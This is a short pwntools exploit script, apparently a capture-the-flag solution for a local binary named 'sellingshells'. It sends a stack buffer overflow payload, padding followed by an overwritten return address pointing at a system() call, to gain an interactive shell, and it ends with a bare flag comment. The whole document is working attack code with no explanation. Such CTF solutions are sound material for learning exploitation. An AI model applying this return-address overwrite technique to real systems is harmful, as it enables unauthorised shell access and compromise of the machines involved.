from pwn import *

r = process('./sellingshells')
raw_input('debug')

check = 0xDEADCAFEBABEBEEF
call_system = 0x4006E3
buf = 'a'*0x12 + p64(call_system )
r.sendlineafter('Would you like a shell?', buf)

r.interactive()
r.close()

# FLAG